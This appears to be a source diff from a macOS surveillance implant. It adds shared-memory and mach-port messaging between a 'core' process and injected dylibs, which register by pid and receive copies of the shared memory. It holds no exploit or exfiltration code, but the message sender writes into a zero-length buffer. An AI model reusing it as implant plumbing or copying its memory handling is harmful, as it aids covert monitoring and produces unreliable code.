@@ -11,12 +11,13 @@
 
 #include <sys/mman.h>
 #include <sys/msg.h>
+#include <mach/message.h>
 #include <fcntl.h>
 
 #import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
-//#define DEBUG
+//#define DEBUG_
 //#define DEBUG_ERRORS
 //#define DEBUG_ERRORS_VERBOSE_1
 
@@ -34,6 +35,79 @@ typedef struct _shMemNewProc
   int magic;
   int pid;
 } shMemNewProc;
+
+// Callback for incoming message...
+CFDataRef coreMessagesHandler(CFMessagePortRef local,
+                              SInt32 msgid,
+                              CFDataRef data,
+                              void *info)
+{
+  CFStringRef       cfNewPort;
+  CFMessagePortRef  new_port = NULL;
+  
+  // paranoid...
+  if (data == NULL || info == NULL) 
+    return NULL;
+  
+  CFRetain(data);
+
+#ifdef DEBUG
+  NSLog(@"%s: msgid %#x recv data len %d", __FUNCTION__, msgid, [data length]);
+#endif
+  
+  RCSISharedMemory  *shMem      = (RCSISharedMemory *)info;
+  shMemNewProc      *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);
+
+  if (msgid == NEWPROCMAGIC && 
+      procBytes->magic == NEWPROCPORT) 
+    { 
+      cfNewPort = CFStringCreateWithFormat(kCFAllocatorDefault, 
+                                           0, 
+                                           CFSTR("%@_%d"), 
+                                           [shMem mFilename], 
+                                           procBytes->pid);
+      
+      new_port  = CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
+      
+      if (new_port == NULL) 
+        {
+#ifdef DEBUG
+        NSLog(@"%s: cannot create remote port %@", __FUNCTION__, cfNewPort);
+#endif
+        }
+      else 
+        {
+        // locked on new command processing by another thread...
+        @synchronized(shMem)
+          {
+            // add to array of machport
+            [shMem addPort: new_port];
+            
+            // duplicate shared memory to new proc...
+            [shMem synchronizeShMemToPort: new_port];
+          }
+          
+          CFRelease(new_port);
+        }
+      
+      CFRelease(cfNewPort);
+    }
+  else 
+    { 
+      NSData *tmpData = [[NSData alloc] initWithBytes: CFDataGetBytePtr(data) 
+                                               length: CFDataGetLength(data)];      
+      @synchronized(shMem)
+      {
+        [shMem.mCoreMessageQueue addObject: tmpData];  
+      }
+      
+      [tmpData release];
+    }
+  
+  CFRelease(data);
+  
+  return NULL;
+}
 
 // Callback for incoming message...
 CFDataRef shMemCallBack (CFMessagePortRef local,
@@ -119,6 +193,8 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 @synthesize mFilename;
 @synthesize mSharedMemory;
 @synthesize mSize;
+@synthesize mCoreMessageQueue;
+@synthesize mLogMessageQueue;
 
 // Called by dylib only
 - (BOOL)isShMemValid
@@ -206,6 +282,7 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
       mSize         = aSize;
       mFilename     = aFilename;
       mRemotePorts  = [[NSMutableArray alloc] initWithCapacity: 0];
+      mCoreMessageQueue = [[NSMutableArray alloc] initWithCapacity: 0];
       mSharedMemory = NULL;
       mMemPort      = NULL;
       mRLSource     = NULL;
@@ -944,6 +1021,108 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 #endif
   
   return bRet;
+}
+
+////////////////////////////////////////////////////////////////
+
+// Core MUST use this to allocate sharedMem objects...
+- (int)createCoreRLSource
+{
+  Boolean bfool = false;
+  CFMessagePortContext shCtx;
+  //CFStringRef kRCSICoreMainRunLoop = CFSTR("kRCSICoreMainRunLoop");
+  
+  memset(&shCtx, 0, sizeof(shCtx));
+  
+  shCtx.info = (void *)self;
+  
+  mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault, 
+                                      (CFStringRef)mFilename, 
+                                      coreMessagesHandler, 
+                                      &shCtx, 
+                                      &bfool);
+  
+  if (mMemPort == NULL) 
+    {
+#ifdef DEBUG
+      NSLog(@"%s: cannot create %@ local port", __FUNCTION__, mFilename);
+#endif
+      return 1;
+    }
+  
+  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
+  
+  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
+  //CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kRCSICoreMainRunLoop);
+  return 0;
+}
+
+- (NSMutableArray*)fetchMessages
+{
+  NSMutableArray *tmpQueue;
+  
+  tmpQueue = [[[NSMutableArray alloc] initWithCapacity:0] autorelease];
+  
+  @synchronized(self)
+  {
+    tmpQueue = [[mCoreMessageQueue copy] autorelease];
+    [mCoreMessageQueue removeAllObjects];
+  }
+  
+  return tmpQueue;
+}
+
+
+typedef struct _coreMessage_t
+{
+  mach_msg_header_t header;
+  uint dataLen;
+} coreMessage_t;
+
++ (BOOL)sendMessageToMachPort:(mach_port_t)port 
+                     withData:(NSData *)aData
+{
+  coreMessage_t *message;
+  kern_return_t err;
+  uint theMsgLen = (sizeof(coreMessage_t) + [aData length]);
+  
+  // released by handleMachMessage
+  NSMutableData *theMsg = [[NSMutableData alloc] 
+                           initWithCapacity: theMsgLen];
+  
+  message = (coreMessage_t*) [theMsg bytes];
+  message->header.msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_MAKE_SEND);
+  message->header.msgh_local_port = MACH_PORT_NULL;
+  message->header.msgh_remote_port = port;
+  message->header.msgh_size = theMsgLen;
+  message->dataLen = [aData length];
+  
+  memcpy((u_char*)message + sizeof(coreMessage_t), [aData bytes], message->dataLen);
+  
+  err = mach_msg((mach_msg_header_t*)message, 
+                 MACH_SEND_MSG, 
+                 theMsgLen, 
+                 0, 
+                 MACH_PORT_NULL, 
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  
+  [theMsg release];
+  
+  if( err != KERN_SUCCESS )
+    {
+#ifdef DEBUG
+      NSLog(@"%s: error sending message to port %d, [%#x]", __FUNCTION__, port, err);
+#endif
+    }
+  else
+    {
+#ifdef DEBUG
+      NSLog(@"%s: message sent to port %d [%#x] retainCount %d", __FUNCTION__, port, theMsg, [theMsg retainCount]);
+#endif
+    }
+  
+  return TRUE;
 }
 
 @end
